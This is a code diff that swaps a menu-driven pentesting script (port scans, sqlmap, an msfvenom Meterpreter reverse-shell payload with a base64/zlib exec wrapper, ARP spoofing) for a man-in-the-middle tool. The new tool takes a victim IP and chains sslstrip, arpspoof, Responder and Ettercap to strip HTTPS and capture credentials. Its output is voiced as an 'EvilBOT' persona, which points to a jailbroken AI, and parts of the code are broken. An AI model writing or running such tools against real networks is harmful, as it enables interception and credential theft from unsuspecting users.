@@ -1,118 +1,68 @@
-import os
 import subprocess
-import sys
-import nmap
-import base64
-import zlib
-
-def scan(ip):
-    nm = nmap.PortScanner()
-    print("Scanning...")
-    nm.scan(ip, '1-65535')
-    print(nm.all_hosts())
-    for host in nm.all_hosts():
-        print('Host : %s (%s)' % (host, nm[host].hostname()))
-        print('State : %s' % nm[host].state())
-        for proto in nm[host].all_protocols():
-            print('Protocol : %s' % proto)
-            lport = nm[host][proto].keys()
-            for port in lport:
-                print('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
-
-def dirbust():
-    url = input("Enter the URL to scan: ")
-    print("Directory busting...")
-    subprocess.call(['dirb', url])
-
-def sqlmap():
-    url = input("Enter the URL to scan: ")
-    print("SQL injection testing...")
-    subprocess.call(['sqlmap', '-u', url])
-
-def nikto():
-    url = input("Enter the URL to scan: ")
-    print("Web server scanning...")
-    subprocess.call(['nikto', '-h', url])
-
-def nuclei():
-    url = input("Enter the URL to scan: ")
-    print("Web server scanning...")
-    subprocess.call(['nuclei', '-u', url])
-
-def msfvenom():
-    print("Creating payload...")
-    ip = input("Enter your IP address: ")
-    port = input("Enter a port: ")
-    payload_name = input("Enter the name of the payload: ")
-    payload = 'windows/meterpreter/reverse_tcp'
-    format = 'exe'
-    encoded_payload = base64.b64encode(payload.encode('utf-8'))
-    compressed_payload = zlib.compress(encoded_payload)
-    encoded_compressed_payload = base64.b64encode(compressed_payload)
-    payload_code = f"import base64,zlib;exec(zlib.decompress(base64.b64decode('{encoded_compressed_payload.decode()}')))"
-    os.system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {format} > {payload_name}.{format}")
-    with open(f'{payload_name}.py', 'w') as f:
-        f.write(payload_code)
-    print("Payload created: {}.{}".format(payload_name, format))
+import time
 
 
-def arp():
-    print("ARP spoofing...")
-    victim_ip = input("Enter victim IP: ")
-    gateway_ip = input("Enter gateway IP: ")
-    subprocess.call(['arpspoof', '-i', 'eth0', '-t', victim_ip, gateway_ip])
+def start_sslstrip(interface):
+    print("<EvilBOT 😈>: Starting SSLstrip...")
+    subprocess.run(['sslstrip', '-i', interface], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+
+def start_arpspoof(interface, victim_ip, gateway_ip):
+    print("<EvilBOT 😈>: Starting ARP Spoofing...")
+    subprocess.run(['arpspoof', '-i', interface, '-t', victim_ip, gateway_ip], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+
+def start_responder(interface):
+    print("<EvilBOT 😈>: Starting Responder...")
+    subprocess.run(['responder', '-I', interface, '-rdwbfv'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+
+def start_ettercap(interface):
+    print("<EvilBOT 😈>: Starting Ettercap...")
+    subprocess.run(['ettercap', '-TqM', 'arp:remote', '-i', interface, '-S', '-L', '-w', 'captured.pcap'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
 def mitm():
-    print("MITM attack...")
-    victim_ip = input("Enter victim IP: ")
-    gateway_ip = input("Enter gateway IP: ")
-    interface = input("Enter Interface of connection: ")
-    subprocess.call(['sslstrip'])
-    subprocess.call(['arpspoof', '-i', 'eth0', '-t', victim_ip, gateway_ip])
-    subprocess.call(f"responder -I  {interface} -P -F -d -b ")
+    print("<EvilBOT 😈>: Initiating MITM attack...")
 
+    # Get the victim's IP address and the gateway's IP address
+    victim_ip = input("<EvilBOT 😈>: Enter victim IP: ")
+    gateway_ip = input("<EvilBOT 😈>: Enter gateway IP: ")
 
-def menu():
-    while True:
-        print("\nWelcome to the Cyber Killchain Pentesting Suite!\n")
-        print("1. Port Scanning")
-        print("2. Directory Busting")
-        print("3. SQLInjection Testing")
-        print("4. Web Server Scanning with Nikto")
-        print("5. Web Server Scanning with Nuclei")
-        print("6. Generate Metasploit Payload")
-        print("7. ARP Spoofing")
-        print("8. Man-in-the-Middle Attack")
-        print("9. Exit\n")
-        choice = input("Enter your choice: ")
-        if choice == '1':
-            ip = input("Enter IP address to scan: ")
-            scan(ip)
-        elif choice == '2':
-            url = input("Enter URL: ")
-            dirbust(url)
-        elif choice == '3':
-            url = input("Enter URL: ")
-            sqlmap(url)
-        elif choice == '4':
-            url = input("Enter URL: ")
-            nikto(url)
-        elif choice == '5':
-            url = input("Enter URL: ")
-            nuclei(url)
-        elif choice == '6':
-            msfvenom()
-        elif choice == '7':
-            arp()
-        elif choice == '8':
-            mitm()
-        elif choice == '9':
-            print("Exiting...")
-            sys.exit()
-        else:
-            print("Invalid choice, please try again.")
+    # Get the name of the network interface to use
+    interface = input("<EvilBOT 😈>: Enter name of network interface to use: ")
 
+    # Start SSLstrip to strip HTTPS encryption
+    sslstrip_process = subprocess.Popen(['sslstrip', '-i', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-if __name__ == '__main__':
-    menu()
+    # Use arpspoof to perform ARP spoofing
+    arpspoof_process = subprocess.Popen(['arpspoof', '-i', interface, '-t', victim_ip, gateway_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    # Use responder to capture authentication credentials
+    responder_process = subprocess.Popen(['responder', '-I', interface, '-rdwbfv'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    # Use Ettercap to sniff and modify network traffic
+    ettercap_process = subprocess.Popen(['ettercap', '-TqM', 'arp:remote', '-i', interface, '-S', '-L', '-w', 'captured.pcap'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    # Store all subprocesses in a list for monitoring
+    processes = [sslstrip_process, arpspoof_process, responder_process, ettercap_process]
+
+    try:
+        # Wait for all processes to complete
+        while True:
+            if all(p.poll() is not None for p in processes):
+                break
+            time.sleep(1)
+    except KeyboardInterrupt:
+        # Terminate all subprocesses on keyboard interrupt
+        for p in processes:
+            p.terminate()
+
+    # Check for errors in subprocesses
+    for p in processes:
+            if p.returncode != 0:
+            print(f"Error in process {p.args}")
+            print(p.stderr)
+            return
+    print("<EvilBOT 😈>: MITM attack complete.")
+
